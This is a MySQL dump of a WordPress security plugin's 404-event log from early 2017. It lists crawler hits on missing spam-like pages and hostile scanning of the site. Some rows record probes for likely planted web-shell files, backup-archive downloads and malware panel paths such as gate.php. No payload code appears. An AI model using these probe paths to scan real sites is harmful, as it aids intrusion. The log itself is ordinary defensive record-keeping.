-- All In One WP Security & Firewall 4.2.5
-- MySQL dump
-- 2017-03-23 15:48:46

SET NAMES utf8;
SET foreign_key_checks = 0;

DROP TABLE IF EXISTS `cmrfu_aiowps_events`;

CREATE TABLE `cmrfu_aiowps_events` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `event_type` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `username` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_id` bigint(20) DEFAULT NULL,
  `event_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ip_or_host` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `referer_info` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `country_code` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_data` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10917 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_aiowps_events` VALUES("10417","404","","0","2017-01-30 07:01:07","66.249.66.37","","/stds/bring-it-on-song320-kbps.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10418","404","","0","2017-01-30 07:08:08","66.249.66.43","","/stds/new-ranbir-aiswery-rai-song-downlod.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10419","404","","0","2017-01-30 07:23:21","66.249.66.37","","/stds/fotos-da-cacau-do-bbb-16.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10420","404","","0","2017-01-30 07:27:09","66.249.66.43","","/stds/google-chrome-9-download.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10421","404","","0","2017-01-30 08:53:11","157.55.39.144","","/stds/kemesraan-abhi-dan-pragya-kumkum-bhagya.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10422","404","","0","2017-01-30 09:17:27","157.55.39.74","","/stds/breakup-hone-ke-baad-pyar-type-status-in-gf.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10423","404","","0","2017-01-30 10:28:57","50.87.248.172","http://herkonyapi.com/wp-includes/SimplePie/XML/files43.php","/wp-includes/SimplePie/XML/files43.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10424","404","","0","2017-01-30 10:29:01","85.128.142.54","http://herkonyapi.com/wp-includes/SimplePie/XML/files43.php","/wp-includes/SimplePie/XML/files43.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10425","404","","0","2017-01-30 10:43:47","66.249.66.43","","/roplt4/Dekha-photo-100-bar-mp3.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10426","404","","0","2017-01-30 11:29:30","66.249.66.37","","/roplt4/bahasa-indonesia-hal-72.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10427","404","","0","2017-01-30 11:49:14","66.249.66.43","","/foa/rohel.php?hl=dolbe-valya-biola-ho-maj","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10428","404","","0","2017-01-30 12:22:24","157.55.39.74","","/stds/family-ek-deal-hd-movies-south.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10429","404","","0","2017-01-30 12:43:45","157.55.39.74","","/stds/dolby-wayla-mp3.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10430","404","","0","2017-01-30 12:51:34","157.55.39.144","","/stds/navratri-2016-jagrn-bhojpuri.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10431","404","","0","2017-01-30 13:02:54","83.27.230.22","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10432","404","","0","2017-01-30 13:57:46","66.249.66.40","","/roplt4/kunci-jawaban-pkn-buku-paket-halaman-46-47.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10433","404","","0","2017-01-30 14:11:39","66.249.66.43","","/stds/tujat-jiv-rangla-rintone.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10434","404","","0","2017-01-30 14:15:27","66.249.66.43","","/stds/link-do-url-logo-512-512.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10435","404","","0","2017-01-30 14:19:14","66.249.66.37","","/stds/desain-undangan-ultah-17.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10436","404","","0","2017-01-30 14:38:10","66.249.66.40","","/stds/majina-second-round-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10437","404","","0","2017-01-30 14:38:39","157.55.39.144","","/stds/nancy-on-dance-jodi-dance-images.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10438","404","","0","2017-01-30 14:56:12","40.77.167.43","","/stds/muhraam-specilal-dj-naat-download.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10439","404","","0","2017-01-30 16:10:31","198.245.49.215","","/roplt4/-download--vide.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10440","404","","0","2017-01-30 17:06:41","157.55.39.144","","/stds/ae-dil-h-mushkil-song-download-in-low-quality.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10441","404","","0","2017-01-30 18:07:52","66.249.66.43","","/foa/rohel.php?hl=mere-shaiya-ji-se-breakup","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10442","404","","0","2017-01-30 18:13:51","66.249.66.40","","/roplt4/Palco-mp3mc-zaak-e-jeer-paranaue.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10443","404","","0","2017-01-30 18:53:01","40.77.167.44","","/stds/indice-reajuste-inss-2017.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10444","404","","0","2017-01-30 19:23:41","66.249.66.43","","/foa/rohel.php?hl=happy-diwali-your-text-edit","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10445","404","","0","2017-01-30 20:44:32","40.77.167.44","","/stds/bhuleya-from-ae-dil.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10446","404","","0","2017-01-30 20:51:23","125.63.60.199","","/stcchatcc.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10447","404","","0","2017-01-30 20:51:31","125.63.60.199","","/wp-content/themes/er-leaf/framework/meta-box/lang/general.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10448","404","","0","2017-01-30 20:51:39","125.63.60.199","","/wp-content/cache/supercache/herkonyapi.com/author/herkon123/sql.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10449","404","","0","2017-01-30 21:39:32","66.249.66.40","","/stds/ik-vari-rington-download.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10450","404","","0","2017-01-30 21:42:10","66.249.66.40","","/roplt4/tu-kehe-to-from-aye-dill-hai-muskil-mp3.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10451","404","","0","2017-01-30 21:43:15","66.249.66.40","","/stds/ek-vari-ayushman-wapking.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10452","404","","0","2017-01-30 21:50:52","66.249.66.63","","/stds/quien-gana-la-isla-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10453","404","","0","2017-01-30 21:58:06","66.249.66.43","","/stds/salon-tendance-2016-2017.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10454","404","","0","2017-01-30 22:03:14","40.77.167.43","","/stds/high-school-juego-de-copiar-examen.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10455","404","","0","2017-01-30 23:11:00","66.249.66.40","","/foa/rohel.php?hl=kalyan-2016-10-26-Risalt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10456","404","","0","2017-01-30 23:23:23","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/1334614411.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10457","404","","0","2017-01-31 00:11:57","66.249.66.40","","/roplt4/www-song-rafla-de-shave-com.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10458","404","","0","2017-01-31 01:05:56","66.249.66.40","","/foa/rohel.php?hl=jase-tusko-karti-hu-spng","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10459","404","","0","2017-01-31 01:17:18","40.77.167.44","","/stds/lava-leniya-pnjabi-sog-dwnlod-hd.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10460","404","","0","2017-01-31 01:27:39","66.249.66.43","","/foa/rohel.php?hl=nase-chad-gayi-mp3-songs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10461","404","","0","2017-01-31 01:32:31","157.55.39.115","","/stds/parmanu-bumb-in-storry.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10462","404","","0","2017-01-31 01:49:49","40.77.167.43","","/stds/zimsko-sunce-turska-serija.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10463","404","","0","2017-01-31 01:50:08","40.77.167.43","","/stds/zimsko-sunce-turska-serija.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10464","404","","0","2017-01-31 02:03:06","40.77.167.43","","/stds/chandra-nandani-free-episode-1-download.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10465","404","","0","2017-01-31 02:28:05","40.77.167.43","","/stds/haryanvi-dancer-sapna-chaudhary-xxx-sexy-photo.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10466","404","","0","2017-01-31 03:38:19","40.77.167.43","","/stds/nibiru-mese-di-ottobre-2017.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10467","404","","0","2017-01-31 03:59:11","66.249.66.40","","/foa/rohel.php?hl=kudi-nasesi-chad-gayi-so","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10468","404","","0","2017-01-31 04:46:58","66.249.66.43","","/roplt4/soal-bab-2-xi-sma.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10469","404","","0","2017-01-31 04:51:07","66.249.66.40","","/stds/remo-movie-quotes-for-ta.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10470","404","","0","2017-01-31 05:09:54","66.249.66.37","","/stds/io-dopo-di-te-jojo-ebook.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10471","404","","0","2017-01-31 05:14:53","66.249.66.40","","/foa/rohel.php?hl=kesarila-chhat-song-2016","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10472","404","","0","2017-01-31 05:21:16","66.249.66.40","","/stds/licencias-para-word-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10473","404","","0","2017-01-31 05:21:44","157.55.39.115","","/stds/ayushman-khurana-new-song-with-ayesha.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10474","404","","0","2017-01-31 05:22:54","97.74.24.134","http://herkonyapi.com/lib.php","/lib.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10475","404","","0","2017-01-31 05:22:58","182.50.135.78","http://herkonyapi.com/lib.php","/lib.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10476","404","","0","2017-01-31 05:28:50","66.249.66.40","","/stds/thodari-movie-pic-quotes.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10477","404","","0","2017-01-31 05:44:38","157.55.39.74","","/images/wapking.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10478","404","","0","2017-01-31 05:59:10","66.249.66.43","","/stds/sun-le-pukar-boliyan-mp3.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10479","404","","0","2017-01-31 06:22:57","157.55.39.74","","/stds/algeria-lineup-against-cameroon.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10480","404","","0","2017-01-31 06:30:41","66.249.66.37","","/foa/rohel.php?hl=don-loding-hd--gana-chat","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10481","404","","0","2017-01-31 06:48:19","185.129.148.181","","/wp-content/hook-filters.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10482","404","","0","2017-01-31 06:48:44","185.129.148.181","","/wp-admin/hook-filters.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10483","404","","0","2017-01-31 07:10:06","66.249.66.3","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10484","404","","0","2017-01-31 07:15:06","66.249.66.60","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10485","404","","0","2017-01-31 07:20:16","66.249.66.3","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10486","404","","0","2017-01-31 07:45:04","157.55.39.115","","/stds/ganador-de-la-isla-2016-la-revancha.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10487","404","","0","2017-01-31 07:46:45","66.249.66.37","","/foa/rohel.php?hl=sinopsis-terakhir-thapki","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10488","404","","0","2017-01-31 08:32:25","157.55.39.74","","/stds/which-colour-should-be-wear-in-navratri-2017.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10489","404","","0","2017-01-31 10:32:09","178.238.232.16","","/?author=2","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10490","404","","0","2017-01-31 10:58:31","66.249.66.40","","/stds/www.numero-de-karol-sevil.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10491","404","","0","2017-01-31 12:06:45","66.249.66.40","","/stds/cara-checkin-path-di-bb10.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10492","404","","0","2017-01-31 12:10:31","66.249.66.37","","/stds/ek-vary-song-daonlod-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10493","404","","0","2017-01-31 12:14:19","66.249.66.63","","/stds/chasse-2016-2017-tunisie.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10494","404","","0","2017-01-31 12:18:06","66.249.66.40","","/stds/tamil-sad-life-ring-tones.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10495","404","","0","2017-01-31 12:21:54","66.249.66.43","","/stds/mere-dil-de-mhl-vich-dong.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10496","404","","0","2017-01-31 13:38:39","40.77.167.44","","/stds/tujhe-me-khoya-rahu-me.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10497","404","","0","2017-01-31 13:39:30","40.77.167.44","","/stds/sultana-kosem-ep-28-sur-nesma-tv.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10498","404","","0","2017-01-31 14:04:58","37.57.25.225","http://herkonyapi.com/wp-menu.php","/wp-menu.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10499","404","","0","2017-01-31 15:22:19","66.249.66.37","","/foa/rohel.php?hl=bhojpuri-mp3-2016chathgit","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10500","404","","0","2017-01-31 17:10:34","95.220.10.98","http://www.herkonyapi.com/neden-kentsel-donusum/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10501","404","","0","2017-01-31 17:44:58","204.79.180.111","http://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10502","404","","0","2017-01-31 17:53:01","66.249.66.37","","/foa/rohel.php?hl=good-man-ngibanjwe-ingoma","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10503","404","","0","2017-01-31 18:17:10","66.249.66.40","","/stds/acha-chalta-hun-duao-main.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10504","404","","0","2017-01-31 18:43:38","66.249.66.43","","/stds/giai-bt-trang-37-dia-li-9.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10505","404","","0","2017-01-31 19:06:23","66.249.66.37","","/stds/config-three-0p0k-11-okto.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10506","404","","0","2017-01-31 19:07:32","40.77.167.44","","/stds/tujhe-me-khoya-rahu-me.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10507","404","","0","2017-01-31 19:08:31","66.249.66.37","","/foa/rohel.php?hl=mp3-kumpulan-semua-di-put","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10508","404","","0","2017-01-31 19:13:57","66.249.66.37","","/stds/tamil-remo-super-hd-sence.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10509","404","","0","2017-01-31 19:17:47","66.249.66.37","","/stds/openvpn-code-2016-oktober.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10510","404","","0","2017-01-31 19:21:33","66.249.66.43","","/stds/udaluravu-eppadi-seivathu.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10511","404","","0","2017-01-31 20:02:25","40.77.167.44","","/stds/evolucion-huracan-nicole.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10512","404","","0","2017-01-31 20:10:21","206.207.117.161","","/wp-content/plugins/revslider/js.zip","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10513","404","","0","2017-01-31 20:10:23","206.207.80.166","","/wp-content/plugins/revslider/js.zip/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10514","404","","0","2017-01-31 20:10:24","206.207.80.174","","/wp-content/plugins/revslider.zip","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10515","404","","0","2017-01-31 20:10:26","206.80.112.118","","/wp-content/plugins/revslider.zip/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10516","404","","0","2017-01-31 20:10:27","209.19.180.105","","/wp-content/plugins.zip","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10517","404","","0","2017-01-31 20:10:28","206.80.114.186","","/wp-content/plugins.zip/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10518","404","","0","2017-01-31 20:10:29","206.207.116.61","","/wp-content.zip","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10519","404","","0","2017-01-31 20:10:31","64.71.205.201","","/wp-content.zip/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10520","404","","0","2017-01-31 20:18:54","40.77.167.84","","/stds/arti-lagu-stran.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10521","404","","0","2017-01-31 20:24:21","66.249.66.43","","/foa/rohel.php?hl=A-dil-hai-muskil-full-mov","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10522","404","","0","2017-01-31 20:58:01","40.77.167.44","","/stds/evolucion-huracan-nicole.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10523","404","","0","2017-01-31 21:29:02","40.77.167.44","","/stds/evolucion-huracan-nicole.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10524","404","","0","2017-01-31 21:40:05","66.249.66.43","","/foa/rohel.php?hl=jayammu-niyashchayamnu-ra","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10525","404","","0","2017-01-31 22:41:45","51.15.46.11","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10526","404","","0","2017-01-31 22:41:46","51.15.46.11","","/theme/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10527","404","","0","2017-01-31 22:41:47","51.15.46.11","","/images/favicon.ico","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10528","404","","0","2017-01-31 22:41:48","51.15.46.11","","/gate.php?request=true","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10529","404","","0","2017-01-31 22:41:49","51.15.46.11","","/home.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10530","404","","0","2017-01-31 22:41:50","51.15.46.11","","/graphics/banner.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10531","404","","0","2017-01-31 22:41:51","51.15.46.11","","/login.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10532","404","","0","2017-01-31 22:41:52","51.15.46.11","","/login.php?op=login","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10533","404","","0","2017-01-31 22:41:53","51.15.46.11","","/project.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10534","404","","0","2017-01-31 22:41:54","51.15.46.11","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10535","404","","0","2017-01-31 22:41:55","51.15.46.11","","/tmp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10536","404","","0","2017-01-31 22:41:56","51.15.46.11","","/tmp/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10537","404","","0","2017-01-31 22:41:57","51.15.46.11","","/vendor","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10538","404","","0","2017-01-31 22:41:58","51.15.46.11","","/vendor/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10539","404","","0","2017-01-31 22:41:59","51.15.46.11","","/lib","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10540","404","","0","2017-01-31 22:42:00","51.15.46.11","","/lib/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10541","404","","0","2017-01-31 22:42:01","51.15.46.11","","/app","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10542","404","","0","2017-01-31 22:42:02","51.15.46.11","","/app/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10543","404","","0","2017-01-31 22:42:03","51.15.46.11","","/tmp/logs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10544","404","","0","2017-01-31 22:42:04","51.15.46.11","","/tmp/logs/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10545","404","","0","2017-01-31 22:42:05","51.15.46.11","","/uploads","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10546","404","","0","2017-01-31 22:42:05","51.15.46.11","","/uploads/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10547","404","","0","2017-01-31 22:42:06","51.15.46.11","","/public","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10548","404","","0","2017-01-31 22:42:08","51.15.46.11","","/public/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10549","404","","0","2017-01-31 22:42:09","51.15.46.11","","/public/css/app.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10550","404","","0","2017-01-31 22:42:12","51.15.46.11","","/p4n3l.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10551","404","","0","2017-01-31 22:42:13","51.15.46.11","","/panel/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10552","404","","0","2017-01-31 22:42:15","51.15.46.11","","/cp.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10553","404","","0","2017-01-31 22:42:16","51.15.46.11","","/theme/images/back-all.jpg","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10554","404","","0","2017-01-31 22:42:18","51.15.46.11","","/theme/header.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10555","404","","0","2017-01-31 22:42:19","51.15.46.11","","/back.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10556","404","","0","2017-01-31 22:42:27","51.15.46.11","","/client/accept.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10557","404","","0","2017-01-31 22:42:28","51.15.46.11","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10558","404","","0","2017-01-31 22:42:29","51.15.46.11","","/main.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10559","404","","0","2017-01-31 22:42:30","51.15.46.11","","/submit.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10560","404","","0","2017-01-31 22:42:32","51.15.46.11","","/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10561","404","","0","2017-01-31 22:42:35","51.15.46.11","","/includes/design/images/favicon.ico","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10562","404","","0","2017-01-31 22:42:37","51.15.46.11","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10563","404","","0","2017-01-31 22:42:39","51.15.46.11","","/assets/img/favicon.ico","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10564","404","","0","2017-01-31 22:42:41","51.15.46.11","","/theme/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10565","404","","0","2017-01-31 22:42:43","51.15.46.11","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10566","404","","0","2017-01-31 22:42:45","51.15.46.11","","/files","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10567","404","","0","2017-01-31 22:42:46","51.15.46.11","","/cp.php?m=login","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10568","404","","0","2017-01-31 22:42:47","51.15.46.11","","/theme/images/back-all.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10569","404","","0","2017-01-31 22:42:47","51.15.46.11","","/theme/header.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10570","404","","0","2017-01-31 22:42:48","51.15.46.11","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10571","404","","0","2017-01-31 22:42:49","51.15.46.11","","/post/echo","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10572","404","","0","2017-01-31 22:42:51","51.15.46.11","","/path/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10573","404","","0","2017-01-31 22:42:52","51.15.46.11","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10574","404","","0","2017-01-31 22:42:53","51.15.46.11","","/files","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10575","404","","0","2017-01-31 22:42:55","51.15.46.11","","/%20img/back","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10576","404","","0","2017-01-31 22:42:56","51.15.46.11","","/img/flags","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10577","404","","0","2017-01-31 22:42:57","51.15.46.11","","/img/softs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10578","404","","0","2017-01-31 22:42:58","51.15.46.11","","/img/back/hawk-clip-art-HAWK03.gif","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10579","404","","0","2017-01-31 22:43:00","51.15.46.11","","/img/logo.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10580","404","","0","2017-01-31 22:43:01","51.15.46.11","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10581","404","","0","2017-01-31 22:43:02","51.15.46.11","","/files","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10582","404","","0","2017-01-31 22:43:03","51.15.46.11","","/%20img/back","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10583","404","","0","2017-01-31 22:43:03","51.15.46.11","","/img/flags","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10584","404","","0","2017-01-31 22:43:04","51.15.46.11","","/img/softs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10585","404","","0","2017-01-31 22:43:05","51.15.46.11","","/img/back/hawk-clip-art-HAWK03.gif","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10586","404","","0","2017-01-31 22:43:06","51.15.46.11","","/img/logo.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10587","404","","0","2017-01-31 22:43:07","51.15.46.11","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10588","404","","0","2017-01-31 22:43:08","51.15.46.11","","/img/logo.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10589","404","","0","2017-01-31 22:43:09","51.15.46.11","","/include/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10590","404","","0","2017-01-31 22:43:10","51.15.46.11","","/js/main.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10591","404","","0","2017-01-31 22:43:11","51.15.46.11","","/img/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10592","404","","0","2017-01-31 22:43:13","51.15.46.11","","/ufr.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10593","404","","0","2017-01-31 22:43:14","51.15.46.11","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10594","404","","0","2017-01-31 22:43:15","51.15.46.11","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10595","404","","0","2017-01-31 22:43:16","51.15.46.11","","/android/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10596","404","","0","2017-01-31 22:43:17","51.15.46.11","","/api.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10597","404","","0","2017-01-31 22:43:17","51.15.46.11","","/data/login.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10598","404","","0","2017-01-31 22:43:19","51.15.46.11","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10599","404","","0","2017-01-31 22:43:20","51.15.46.11","","/img","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10600","404","","0","2017-01-31 22:43:21","51.15.46.11","","/img/banners","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10601","404","","0","2017-01-31 22:43:22","51.15.46.11","","/img","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10602","404","","0","2017-01-31 22:43:23","51.15.46.11","","/img/banners","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10603","404","","0","2017-01-31 22:43:31","51.15.46.11","","/img","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10604","404","","0","2017-01-31 22:43:32","51.15.46.11","","/img/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10605","404","","0","2017-01-31 22:43:33","51.15.46.11","","/includes","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10606","404","","0","2017-01-31 22:43:34","51.15.46.11","","/includes/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10607","404","","0","2017-01-31 22:43:34","51.15.46.11","","/statistics.php","","");
